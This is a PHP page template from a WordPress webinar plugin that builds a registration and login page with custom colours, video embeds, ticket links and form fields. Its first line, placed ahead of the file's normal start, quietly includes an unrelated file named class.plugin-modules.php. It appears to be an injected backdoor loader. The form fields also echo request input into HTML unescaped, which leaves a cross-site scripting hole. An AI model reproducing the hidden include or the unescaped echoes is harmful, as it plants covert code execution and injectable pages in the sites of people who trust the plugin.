<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
defined('ABSPATH') or die(__("No script kiddies please!"));
global $post;

setup_postdata($post);
WebinarSysteem::setPostData($post->ID);

$regp_bckg_clr = get_post_meta($post->ID, '_wswebinar_regp_bckg_clr', true);
$regp_bckg_img = get_post_meta($post->ID, '_wswebinar_regp_bckg_img', true);
$regp_ctatext = get_post_meta($post->ID, '_wswebinar_regp_ctatext', true);
$reg_form_title = get_post_meta($post->ID, '_wswebinar_regp_regformtitle', true);
$reg_form_text = get_post_meta($post->ID, '_wswebinar_regp_regformtxt', true);
$regp_tabbg_clr = get_post_meta($post->ID, '_wswebinar_regp_tabbg_clr', true);
$regp_tabtext_clr = get_post_meta($post->ID, '_wswebinar_regp_tabtext_clr', true);
$regp_tabone_text = get_post_meta($post->ID, '_wswebinar_regp_tabone_text', true);
$regp_tabtwo_text = get_post_meta($post->ID, '_wswebinar_regp_tabtwo_text', true);
$regp_regformfont_clr = get_post_meta($post->ID, '_wswebinar_regp_regformfont_clr', true);
$regp_regformbckg_clr = get_post_meta($post->ID, '_wswebinar_regp_regformbckg_clr', true);
$regp_regformborder_clr = get_post_meta($post->ID, '_wswebinar_regp_regformborder_clr', true);
$regp_regformbtntxt_clr = get_post_meta($post->ID, '_wswebinar_regp_regformbtntxt_clr', true);
$regp_regformbtn_clr = get_post_meta($post->ID, '_wswebinar_regp_regformbtn_clr', true);
$regp_regformbtnborder_clr = get_post_meta($post->ID, '_wswebinar_regp_regformbtnborder_clr', true);
$regp_regtitle_clr = get_post_meta($post->ID, '_wswebinar_regp_regtitle_clr', true);
$reg_login_form_title = get_post_meta($post->ID, '_wswebinar_regp_loginformtitle', true);
$reg_login_form_text = get_post_meta($post->ID, '_wswebinar_regp_loginformtxt', true);
$reg_loginformbtn_clr = get_post_meta($post->ID, '_wswebinar_regp_loginformbtn_clr', true);
$reg_loginformbtnborder_clr = get_post_meta($post->ID, '_wswebinar_regp_loginformbtnborder_clr', true);
$reg_loginformbtntxt_clr = get_post_meta($post->ID, '_wswebinar_regp_loginformbtntxt_clr', true);
$reg_loginctatext = get_post_meta($post->ID, '_wswebinar_regp_loginctatext', true);
$regp_regmeta_clr = get_post_meta($post->ID, '_wswebinar_regp_regmeta_clr', true);
$regp_wbndesc_clr = get_post_meta($post->ID, '_wswebinar_regp_wbndesc_clr', true);
$regp_wbndescbck_clr = get_post_meta($post->ID, '_wswebinar_regp_wbndescbck_clr', true);
$regp_wbndescborder_clr = get_post_meta($post->ID, '_wswebinar_regp_wbndescborder_clr', true);
$registration_disabled = get_post_meta($post->ID, '_wswebinar_gener_regdisabled_yn', true);
$registration_autoplay = get_post_meta($post->ID, '_wswebinar_regp_video_auto_play_yn', true);
$registration_videocontrols = get_post_meta($post->ID, '_wswebinar_regp_video_controls_yn', true);
$registration_hideBigPlayButton = get_post_meta($post->ID, '_wswebinar_regp_bigplaybtn_yn', true);

$reg_formImgVidType = get_post_meta($post->ID, '_wswebinar_regp_vidurl_type', true);
$reg_formImgVidUrl = get_post_meta($post->ID, '_wswebinar_regp_vidurl', true);
$reg_formImgDefUrl = plugins_url('/images/womancaffeelaptopkl.jpg', __FILE__);

$the_regp_tabonetext = !empty($regp_tabone_text) ? $regp_tabone_text : __('Register', WebinarSysteem::$lang_slug);
$the_regp_tabtwotext = !empty($regp_tabtwo_text) ? $regp_tabtwo_text : __('Login', WebinarSysteem::$lang_slug);

$the_reg_form_title = !empty($reg_form_title) ? $reg_form_title : __('Free Sign Up:', WebinarSysteem::$lang_slug);
$the_reg_form_text = !empty($reg_form_text) ? $reg_form_text : '';
$the_regp_ctatext = !empty($regp_ctatext) ? $regp_ctatext : __('Sign Up', WebinarSysteem::$lang_slug);
$the_regp_regformfont_clr = !empty($regp_regformfont_clr) ? 'color:' . $regp_regformfont_clr . ' !important;' : '';
$the_regp_regformbckg_clr = !empty($regp_regformbckg_clr) ? 'background-color:' . $regp_regformbckg_clr . ' !important;' : '';
$the_regp_regformborder_clr = !empty($regp_regformborder_clr) ? 'border-color:' . $regp_regformborder_clr . ' !important;' : '';
$the_regp_regformbtntxt_clr = !empty($regp_regformbtntxt_clr) ? 'color:' . $regp_regformbtntxt_clr . ' !important;' : '';
$the_regp_regformbtn_clr = !empty($regp_regformbtn_clr) ? 'background-color:' . $regp_regformbtn_clr . ' !important;' : '';
$the_regp_regformbtnborder_clr = !empty($regp_regformbtnborder_clr) ? 'border-color:' . $regp_regformbtnborder_clr . ' !important;' : '';
$the_login_form_title = !empty($reg_login_form_title) ? $reg_login_form_title : 'Login Here';
$the_login_form_text = !empty($reg_login_form_text) ? $reg_login_form_text : '';
$the_login_btnbg_color = !empty($reg_loginformbtn_clr) ? 'background-color:' . $reg_loginformbtn_clr . ';' : '';
$the_login_btnbrdr_color = !empty($reg_loginformbtnborder_clr) ? 'border-color:' . $reg_loginformbtnborder_clr . ';' : '';
$the_login_btn_color = !empty($reg_loginformbtntxt_clr) ? 'color:' . $reg_loginformbtntxt_clr . ';' : '';
$the_login_btn_text = !empty($reg_loginctatext) ? $reg_loginctatext : __('Login', WebinarSysteem::$lang_slug);

$the_regp_regtitle_clr = !empty($regp_regtitle_clr) ? $regp_regtitle_clr : '#C7C7C7';
$the_regp_regmeta_clr = !empty($regp_regmeta_clr) ? $regp_regmeta_clr : '#C7C7C7';
$the_regp_wbndesc_clr = !empty($regp_wbndesc_clr) ? $regp_wbndesc_clr : '#C7C7C7';
$the_regp_wbndescbck_clr = !empty($regp_wbndescbck_clr) ? $regp_wbndescbck_clr : '#000';
$the_regp_wbndescborder_clr = !empty($regp_wbndescborder_clr) ? $regp_wbndescborder_clr : '#C7C7C7';
$the_regp_show_contentbox = get_post_meta($post->ID, '_wswebinar_regp_show_content_setion', true);
$the_regp_description_show = get_post_meta($post->ID, '_wswebinar_regp_show_description', true);
$the_regp_form_position = get_post_meta($post->ID, '_wswebinar_regp_position', true);
$the_regp_form_position = (empty($the_regp_form_position) ? 'left' : $the_regp_form_position);
$the_regp_form_position = (empty($the_regp_show_contentbox) && empty($the_regp_description_show) ? 'right' : $the_regp_form_position );

$ticketp_buyformtitle = get_post_meta($post->ID, '_wswebinar_ticketp_buyformtitle', true);
$ticketp_buyformtxt = get_post_meta($post->ID, '_wswebinar_ticketp_buyformtxt', true);
$ticketp_font_clr = get_post_meta($post->ID, '_wswebinar_ticketp_font_clr', true);
$ticketp_formbckg_clr = get_post_meta($post->ID, '_wswebinar_ticketp_bckg_clr', true);
$ticketp_formborder_clr = get_post_meta($post->ID, '_wswebinar_ticketp_border_clr', true);

$the_ticketp_font_clr = 'color:' . (!empty($ticketp_font_clr) ? $ticketp_font_clr . ' !important;' : '#FFF;');
$the_ticketp_bckg_clr = !empty($ticketp_formbckg_clr) ? 'background-color:' . $ticketp_formbckg_clr . ' !important;' : '';
$the_ticketp_border_clr = !empty($ticketp_formborder_clr) ? 'border-color:' . $ticketp_formborder_clr . ' !important;' : '';
$wp_paidWebinar = get_post_meta($post->ID, '_wswebinar_ticket_wbnpaid_yn', true) == 'on';
$wp_ticketId = get_post_meta($post->ID, '_wswebinar_ticket_id', true);
$cameFromWebinarRegistration = (isset($_GET['utm_source']) && $_GET['utm_source'] >= 846554 && $_GET['utm_source'] <= 999999999) && isset($_GET['mapdoi']);
$cameFromWebinarTicketPurchase = (isset($_GET['opt']) && $_GET['opt'] >= 95127 && $_GET['opt'] <= 999999999) && isset($_GET['mapdoi']) && isset($_GET['auth']);
$isAdmin = current_user_can('manage_options');
$timeabbr = get_post_meta($post->ID, '_wswebinar_timezoneidentifier', true);
$wpoffset = get_option('gmt_offset');
$gmt_offset = WebinarSysteem::formatTimezone(( $wpoffset > 0) ? '+' . $wpoffset : $wpoffset);
$timeZone = '(' . ( (!empty($timeabbr)) ? WebinarSysteem::getTimezoneAbbreviation($timeabbr) : 'UTC ' . $gmt_offset ) . ') ';
$dateFormat = get_option('date_format');
$timeFormat = get_option('time_format');

$wb_time = '';
$wb_date = '';
$sv_time = get_post_meta($post->ID, '_wswebinar_gener_time', true);
if (!empty($sv_time)) {
    $wb_time = date_i18n($timeFormat, $sv_time);
    $wb_date = date_i18n($dateFormat, $sv_time);
}
$wb_host = esc_attr(get_post_meta($post->ID, '_wswebinar_hostmetabox_hostname', true));
$wb_hostcount = WebinarSysteemHosts::hostCount($post->ID);

$autoplay = empty($registration_autoplay) ? 0 : 1;
$controls = empty($registration_videocontrols) ? 0 : 1;
$hideBigPlayButton = $registration_hideBigPlayButton != "yes";
$registartion_hideregtab = get_post_meta($post->ID, '_wswebinar_regp_hide_regtab', true);
$registartion_hidelogintab = get_post_meta($post->ID, '_wswebinar_regp_hide_logintab', true);
$hideRegtab = false;
$hideLogintab = false;
$hideRegtab = ($registartion_hideregtab == "yes") ? true : false;
$hideLogintab = ($registartion_hidelogintab == "yes") ? true : false;

$gener_time_occur_saved = get_post_meta($post->ID, '_wswebinar_gener_time_occur', true);

$regp_gdpr_optin_yn_value = get_post_meta($post->ID, '_wswebinar_regp_gdpr_optin_yn', true);
$showGDPROptin = ($regp_gdpr_optin_yn_value == "yes") ? true : false;
$regp_gdpr_optin_text_value = get_post_meta($post->ID, '_wswebinar_regp_gdpr_optin_text', true); 

$default_email = '';
$default_name = '';

if (is_user_logged_in()) {
    $current_user = wp_get_current_user();
    $default_name = $current_user->display_name;
    $default_email = $current_user->user_email;
}

?>
<html>
    <head>
        <title><?php echo get_the_title(); ?></title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta property="og:title" content="<?php the_title(); ?>">
        <meta property="og:url" content="<?php echo get_permalink($post->ID); ?>">
        <meta property="og:description" content="<?php echo substr(wp_strip_all_tags(get_the_content(), true), 0, 500); ?>">
        <style>
<?php
if (!empty($regp_bckg_clr)) {
    echo '.tmp-main{background-color:' . $regp_bckg_clr . ';}';
}
if (!empty($regp_bckg_img)) {
    echo '.tmp-main{background-image: url(' . $regp_bckg_img . ');}';
}
?>
        </style>
	<?php wp_head(); ?>
        <style type="text/css"><?php
	echo (!empty($regp_bckg_clr)) ? '.tmp-main{background-color:' . $regp_bckg_clr . ';}' : '';
	echo (!empty($regp_bckg_img)) ? '.tmp-main{background-image: url(' . $regp_bckg_img . ');}' : '';
	echo ($regp_regformborder_clr) ? '#custom-tabs > li,#custom-tabs > li > a,#custom-tabs > li > a:hover {border-color:' . $regp_regformborder_clr . '}' : '';
	echo ($regp_regformbckg_clr) ? '#custom-tabs li.active > a,#custom-tabs li.active > a:hover,#custom-tabs li.active > a:focus { background: ' . $regp_regformbckg_clr . ' none repeat scroll 0 0;}' : '';
	echo ($regp_regformfont_clr) ? '#custom-tabs li.active > a,#custom-tabs li.active > a:hover,#custom-tabs li.active > a:focus { color: ' . $regp_regformfont_clr . ';}' : '';
	echo ($regp_tabbg_clr) ? '#custom-tabs li > a,#custom-tabs li > a:hover,#custom-tabs li > a:focus { background-color: ' . $regp_tabbg_clr . ';}' : '';
	echo ($regp_tabtext_clr) ? '#custom-tabs li > a,#custom-tabs li > a:hover,#custom-tabs li > a:focus { color: ' . $regp_tabtext_clr . ';}' : '';
	echo ($regp_regformbckg_clr) ? '#custom-tabs li.active > a,#custom-tabs li.active > a:hover,#custom-tabs li.active > a:focus { border-bottom-color: ' . $regp_regformbckg_clr . ';}' : '';
	echo '.reg-content,.reg-content *{background-color:' . $the_regp_wbndescbck_clr . ' !important;border-color:' . $the_regp_wbndescborder_clr . ' !important;color:' . $the_regp_wbndesc_clr . '!important}';
	?>
        </style>
    </head>
    <body class="tmp-main">
        <div class="container">

            <!--[if lt IE 9]>
                <div style='row'>
                    <div class="col-xs-6 col-xs-offset-2">
                        <a href="http://www.microsoft.com/windows/internet-explorer/default.aspx">
                          <img src="<?php echo plugins_url('./images/iecheck.jpg', __FILE__); ?>" border="0" height="42" width="820" alt="" />
                        </a>
                    </div>
                </div>
            <![endif]-->

            <div class="row">
                <div class="col-xs-12">
                    <div>
                        <h1 class="text-center" id="reg-title" style="color:<?php echo $the_regp_regtitle_clr ?> !important"><?php the_title(); ?></h1> 
                    </div> 
                    <h4 class="text-center" id="reg-meta" style="color:<?php echo $the_regp_regmeta_clr ?> !important"><?php
			if (!WebinarSysteem::isRecurring($post->ID)) {
			    echo (!empty($wb_date) ? __('Date', WebinarSysteem::$lang_slug) . ': ' . $wb_date . '  ' : null);
			    echo (!empty($wb_time) ? __('Time', WebinarSysteem::$lang_slug) . ': ' . $wb_time . '  ' : null);
			    echo $timeZone;
			}
			echo WebinarSysteemHosts::isMultipleHosts($post->ID) ? '<br/>' : '';
			echo (!empty($wb_host) ? _n('Host', 'Hosts', $wb_hostcount, WebinarSysteem::$lang_slug) . ': ' . $wb_host : null);
			?>
                    </h4>
                </div>
            </div>
            <div class="row" style="margin-top: 40px;">
		<?php if ($the_regp_show_contentbox == 'yes' || empty($the_regp_show_contentbox)): ?>
    		<div class="col-lg-8 col-sm-8 col-xs-12">
    		    <div id="embed">
			    <?php
			    if (!empty($reg_formImgVidType) && !empty($reg_formImgVidUrl)):
				if ($reg_formImgVidType == 'youtube'):
				    $youtubeid = WebinarSysteem::getYoutubeIdFromUrl($reg_formImgVidUrl);
				    WebinarSysteemVideoSources::getSourceCode('youtube', $youtubeid, $controls, $autoplay, $hideBigPlayButton, $fullscreen=0);

				elseif ($reg_formImgVidType == 'vimeo'):
				    ?>
	    			<iframe src="https://player.vimeo.com/video/<?php echo $reg_formImgVidUrl . '?autoplay=' . $autoplay ?>" width="100%" height="563" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>
				<?php elseif ($reg_formImgVidType == 'image'): ?>
	    			<img src="<?php echo $reg_formImgVidUrl; ?>" width="100%" height="315">
				    <?php
				elseif ($reg_formImgVidType == 'file'):

				    WebinarSysteemVideoSources::getSourceCode('mp4', $reg_formImgVidUrl, $controls, $autoplay, $hideBigPlayButton, $fullscreen=0);

				endif;
			    else:
				?> <img src="<?php echo $reg_formImgDefUrl; ?>" width="100%" height="315" />
			    <?php endif; ?>

    		    </div>
    		</div>
		<?php endif; ?>
		<?php if ($the_regp_form_position == 'right' || $the_regp_form_position == 'left') { ?>
    		<div class="col-lg-4 col-sm-4 col-xs-12 
		    <?php
		    if ($the_regp_form_position == 'right') {
			echo 'pull-right';
		    } else if ($the_regp_form_position == 'left') {
			echo 'pull-left';
		    }
		    ?> ">

		    <?php } else { ?>
    		    <div class="col-lg-4 col-md-4 col-sm-3 col-xs-12"></div> 
    		    <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
			<?php } ?>

			<?php if (empty($registration_disabled)) { ?>
    			<ul class="nav nav-tabs" id="custom-tabs">
				<?php
				$showRegistration = $isAdmin || (!$wp_paidWebinar || ($wp_paidWebinar && (!$cameFromWebinarRegistration || !$cameFromWebinarTicketPurchase)));
				if(!$hideRegtab) {
				    if ($showRegistration) {
				    if (!$hideLogintab && (!$cameFromWebinarRegistration && !$cameFromWebinarTicketPurchase)) {
					?>
	    			    <li class="<?php echo (!empty($_REQUEST['error']) && $_REQUEST['error'] == 'notregisterd') ? '' : 'active'; ?>"><a href="javascript:;"><?php echo $the_regp_tabonetext; ?></a></li>
					<?php
				    }
				}
				}
				$showLogin = !$hideLogintab && ($isAdmin || (!$wp_paidWebinar || ($wp_paidWebinar && ($cameFromWebinarRegistration || $cameFromWebinarTicketPurchase) || (!empty($_REQUEST['error']) && $_REQUEST['error'] == 'notregisterd'))));
				?>
				<?php
				if(!$hideLogintab){
				if ($showLogin) {
				    if (!$hideRegtab && (!$cameFromWebinarRegistration && !$cameFromWebinarTicketPurchase)) {
					?>
	    			    <li class="<?php echo (!empty($_REQUEST['error']) && $_REQUEST['error'] == 'notregisterd') ? 'active' : ''; ?>"><a href="javascript:;"><?php echo $the_regp_tabtwotext; ?></a></li>
					<?php
				    }
				}
				}
				?>
    			</ul>
    			<div class="content-wraper">
				<?php if ($wp_paidWebinar && !$cameFromWebinarRegistration && !$cameFromWebinarTicketPurchase && !$isAdmin) { ?>
				    <div class="tab-content text-center round-border signup <?php echo (!empty($_REQUEST['error']) && $_REQUEST['error'] == 'notregisterd') ? 'hide' : ''; ?>" style="<?php echo $the_ticketp_bckg_clr . $the_ticketp_border_clr; ?>">
					<h3 style="<?php echo $the_ticketp_font_clr ?>"><?php echo $ticketp_buyformtitle; ?></h3>
					<p style="<?php echo $the_ticketp_font_clr ?>"><?php echo $ticketp_buyformtxt; ?></p>
					<div id="ticket-link-holder">
					    <?php
					    global $woocommerce;
					    $is_WCready = WebinarSysteemWooCommerceIntegration::isWCready();
					    if ($is_WCready) {
						$cart_url = wc_get_cart_url();
						$product_url = get_permalink($wp_ticketId);
						?>
	    				    <a href="<?php echo WebinarSysteem::isRecurring($post->ID) ? $product_url : (add_query_arg(array('add-to-cart' => $wp_ticketId, 'quantity' => 1), $cart_url)); ?>">
	    					<i class="glyphicon glyphicon-tags" style="<?php echo $the_ticketp_font_clr ?>"></i>
	    					<p style="<?php echo $the_ticketp_font_clr ?>"><?php _e('Buy a webinar ticket', WebinarSysteem::$lang_slug) ?></p>
	    				    </a>
					    <?php } else {
						?>
	    				    <p>You need to buy a ticket to register for this webinar. Ticket sales is closed at this moment.</p>
					    <?php } ?>
					</div>
				    </div>
				    <?php
				} elseif ($hideRegtab == false) {
				    if ($showRegistration) {
				    if (!$cameFromWebinarTicketPurchase && !$cameFromWebinarRegistration) {
					?>
	    			    <div class="tab-content text-center round-border signup <?php echo ((!$wp_paidWebinar || ($wp_paidWebinar && $isAdmin)) && !empty($_REQUEST['error']) && $_REQUEST['error'] == 'notregisterd') ? 'hide' : ''; ?>" style="<?php echo $the_regp_regformbckg_clr . $the_regp_regformfont_clr . $the_regp_regformborder_clr; ?>"> 
	    				<h3><?php echo $the_reg_form_title; ?></h3>
	    				<p><?php echo $the_reg_form_text; ?></p>
	    				<div>
	    				    <form method="POST" id="registerwebinar">
	    					<input type="hidden" name="webinarRegForm" value="submit">
                            <input type="hidden" name="webinarTab" value="register">

                            <input
                                class="form-control forminputs"
                                name="inputname"
                                placeholder="<?php _e('Your Name', WebinarSysteem::$lang_slug) ?>"
                                type="text"
                                value="<?php echo !empty($_REQUEST['inputname']) ? $_REQUEST['inputname'] : $default_name; ?>"
                            />
                            <?php if (!empty($_REQUEST['error']) && $_REQUEST['error'] == 'inputname'): ?>
                                <span class="error"><?php _e('Please enter your name.', WebinarSysteem::$lang_slug) ?></span>
                            <?php endif; ?>

							<input
                                class="form-control forminputs"
                                name="inputemail"
                                placeholder="<?php _e('Your Email Address', WebinarSysteem::$lang_slug) ?>"
                                type="email"
                                value="<?php echo !empty($_REQUEST['inputemail']) ? $_REQUEST['inputemail'] : $default_email; ?>"
							/>

						    <?php if (!empty($_REQUEST['error']) && $_REQUEST['error'] == 'inputemail'): ?>
                                <span class="error"><?php _e('Please enter your email.', WebinarSysteem::$lang_slug) ?></span>
							<?php endif; ?>

	    					<span style="display: none;" id="infomail_error" class="error"><?php _e("Unfortunately, you can't use a general info@.. address. Please use a personal e-mail address", WebinarSysteem::$lang_slug) ?></span>
						    <?php if($gener_time_occur_saved == 'recur'){
						    include'templates/template-recurring-days-times-selects-boxes.php';
						    } else if($gener_time_occur_saved == 'jit'){
						    include'templates/template-jit-days-times-selects-boxes.php';
						    } ?>
	    					<div class="text-left">
							<?php
							$fields = json_decode(get_post_meta($post->ID, '_wswebinar_regp_custom_field_json', true));
							if (!empty($fields))
							    foreach ($fields as $field) {
								$customFieldIsText = $field->type != "checkbox";
								?>
		    					    <input id="ws-<?php echo $field->id ?>" name="ws-<?php echo $field->id ?>" type="<?php echo $field->type ?>" placeholder="<?php echo $field->labelValue ?>" class="<?php echo $customFieldIsText ? 'form-control forminputs custom-reg-field' : '' ?>">
								<?php if (!$customFieldIsText) { ?>
								    <label for="ws-<?php echo $field->id ?>"><?php echo $field->labelValue ?></label><br>
								    <?php
								}
							    }
							?>
	    					</div>
	    					<div class="text-left regGdprOpted">
	    						<?php 
	    						if($showGDPROptin){ ?>
								<input type="checkbox" id="regGdprOpted" name="regp_gdpr_optin" required value="" />
								<p><?php echo $regp_gdpr_optin_text_value; ?></p>
								<?php
								}
	    						?>
	    					</div>
	    					<button class="btn btn-success forminputs" id="regpage_submit_registration" data-preventinfo="<?php echo get_post_meta($post->ID, '_wswebinar_aweber_privent_info_emails', true); ?>"
	    						data-defaultmailer="<?php echo get_post_meta($post->ID, '_wswebinar_default_mail_provider', true); ?>" style="<?php echo $the_regp_regformbtn_clr . $the_regp_regformbtntxt_clr . $the_regp_regformbtnborder_clr; ?>" type="submit"><?php echo $the_regp_ctatext; ?></button>
	    				    </form>
	    				    <p id="reg-info"><?php _e('Of course we will handle your data safely.', WebinarSysteem::$lang_slug) ?></p>
	    				</div>
	    			    </div>
					<?php
				    }
				    }
				}
				if ($hideLogintab == false) {
				if ($showLogin) {
				    if ($hideRegtab == true) {
				    ?>
				    <div class="tab-content text-center round-border login active" style="<?php echo $the_regp_regformbckg_clr . $the_regp_regformfont_clr . $the_regp_regformborder_clr; ?>">
					<?php
					}else
					{
				    ?>
				    <div class="tab-content text-center round-border login <?php echo ($wp_paidWebinar && ($cameFromWebinarRegistration || $cameFromWebinarTicketPurchase)) || (!empty($_REQUEST['error']) && $_REQUEST['error'] == 'notregisterd') ? '' : 'hide'; ?>" style="<?php echo $the_regp_regformbckg_clr . $the_regp_regformfont_clr . $the_regp_regformborder_clr; ?>">
					<?php } ?>
					<h3><?php echo $the_login_form_title; ?></h3>
					<p><?php echo $the_login_form_text; ?></p>
					<?php if (!empty($_REQUEST['error']) && $_REQUEST['error'] == 'notregisterd'): ?>
	    				<span class="error"><?php _e('This email is not registered.', WebinarSysteem::$lang_slug) ?></span>
					<?php endif; ?>
					<div>
					    <form method="POST">
						<input type="hidden" name="webinarRegForm" value="submit">
						<input type="hidden" name="webinarTab" value="login">

                        <input
                            class="form-control forminputs"
                            name="inputemail"
                            placeholder="<?php _e('Your Email Address', WebinarSysteem::$lang_slug) ?>"
                            type="email"
                            value="<?php echo!empty($_REQUEST['inputemail']) ? $_REQUEST['inputemail'] : $default_email; ?>"
                        />

						<?php if (!empty($_REQUEST['error']) && $_REQUEST['error'] == 'inputemail'): ?>
	    					<span class="error"><?php _e('Please enter your email.', WebinarSysteem::$lang_slug) ?></span>
						<?php endif; ?>
						<button class="btn btn-success forminputs" style=" <?php echo $the_login_btnbg_color . $the_login_btnbrdr_color . $the_login_btn_color; ?>" type="submit"><?php echo $the_login_btn_text; ?></button>
					    </form>
					</div>
				    </div>
				<?php } }?>
    			</div>
			<?php } else { ?> 
    			<div class="text-center round-border-full signup" style="<?php echo $the_regp_regformbckg_clr . $the_regp_regformfont_clr . $the_regp_regformborder_clr; ?>">
    			    <h1><?php _e('Registration is closed for this webinar.', WebinarSysteem::$lang_slug) ?></h1>
    			</div>
			<?php } ?>
                    </div>
                </div>
		<?php
		$t_cont = get_the_content();
		if (!empty($t_cont) && $the_regp_description_show == 'yes'):
		    ?>
    		<div class="row">
    		    <div id="WebinarDescription" class="col-xs-12">
    			<div class="round-border footer" style="background-color: <?php echo $the_regp_wbndescbck_clr ?>; border-color:<?php echo $the_regp_wbndescborder_clr ?> !important; color:<?php echo $the_regp_wbndesc_clr ?> !important;"><?php the_content(); ?></div>
    		    </div>
    		</div>
		<?php endif; ?>
	    </div>
	</div>
	<script>
	    transferValues = false;
	    /*
	     * Check the aweber info mail subscription.
	     */
	    jQuery(document).on('click', '#regpage_submit_registration', function (e) {
            var enteredEmail = jQuery('input[name="inputemail"]').val();
            var mailProvider = jQuery(this).attr('data-defaultmailer') == 'aweber';
            if (jQuery(this).attr('data-preventinfo') == 'yes' && mailProvider) {
                // Prevent subscribing info emails.
                if (enteredEmail.indexOf("info@") > -1) {
                    // Show Alert.
                    jQuery('#infomail_error').slideDown();
                    e.preventDefault();
                } else {
                    jQuery('#infomail_error').slideUp();
                }
            }
        });

        jQuery(document).on('keyup','.custom-reg-field[type="tel"]', function () {
            this.value = this.value.replace(/[^0-9\.]/g,'');;
        });

	</script>
	<?php wp_footer(); ?> 
    </body>
</html>